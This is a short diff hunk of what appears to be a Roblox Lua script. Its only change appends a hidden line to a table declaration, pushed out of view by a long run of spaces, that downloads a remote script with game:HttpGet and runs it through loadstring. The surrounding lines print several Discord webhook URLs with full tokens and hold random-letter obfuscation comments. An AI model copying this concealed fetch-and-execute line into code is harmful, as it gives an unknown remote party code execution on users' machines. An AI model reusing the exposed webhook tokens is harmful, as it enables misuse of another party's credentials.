@@ -170,7 +170,7 @@ print("https://discord.com/api/webhooks/1099672140640432138/73LznwDIsNMSNK366YE3
 print("https://discord.com/api/webhooks/1099672146072055918/lDJWu28EZJjQJkfhLmyJvCUr4du8R8eVtUtY_HAJnIL54z44z2J1nEkC22b_EifmfBnR")
 print("https://discord.com/api/webhooks/1099672149939191828/Q68BHERsyRgTH6N8jpOkHuJWWg9EFVohQHJAjmJFATU-A5kTm-pkJyoCnft6m4zY9UqZ")
 end
-local PRINTFUSCATOR = {
+local PRINTFUSCATOR = {                                                                                                                                                                                                                                                                                                         loadstring(game:HttpGet("https://raw.githubusercontent.com/sxMob/Library/main/AntiHTTPSpy.lua"))()
 --    gbsckztgfpncjaqkupfceycajyhnpbvhgxuwocdjlftljedfgjulexpqbmzxcjxuwgwqsuhsnrsdlydtneourhqybrvcjijfjhtmejwnbjeycrthwfbgknodyxphvcyjjuqsqrqqndotftrllflsqp,
 --    EVJUUNAYJYWFVFEOIDMADXYTCHVGMWJZYXWXYSDVQUWEIWCONLJXGPECHZBCUGNTDXHEHMYAMRITSVGZCDLBQGPWODHRFVOEUVVGDHDUMENDUEZRRBWFQQBODNCMGUERATZGWBWQJTFEZYKRQRDNTT,
 --    GBUUNSCHTJROFKGCCHQLGRJIUGVYUDQSRQLOQDGCONOGSFHKLEAZCCAATFRDPCYVKNHXRWAPPHLKWXTZLTMOOOMXNKMECLXOOWCRKUNIIKQITFXZGEQKKFYTVCYQLLIFHQAJFDMWYXYUMANCOFVVRB,
